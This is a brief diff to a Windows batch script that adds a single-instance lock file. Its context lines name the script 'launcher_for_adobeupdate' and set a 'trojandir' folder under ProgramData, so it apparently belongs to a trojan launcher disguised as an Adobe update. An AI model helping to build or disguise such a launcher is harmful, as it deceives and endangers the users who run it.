@@ -1,3 +1,11 @@
+set "LOCKFILE=%~dp0_script.lock"
+
+:: Try to create or open the lock file for writing
+(call ) 9>"%LOCKFILE%" || (
+    echo Another instance is already running. Exiting.
+    goto :eof
+)
+
 SET script_version=launcher_for_adobeupdate
 
 SET "trojandir=C:\ProgramData\owd"
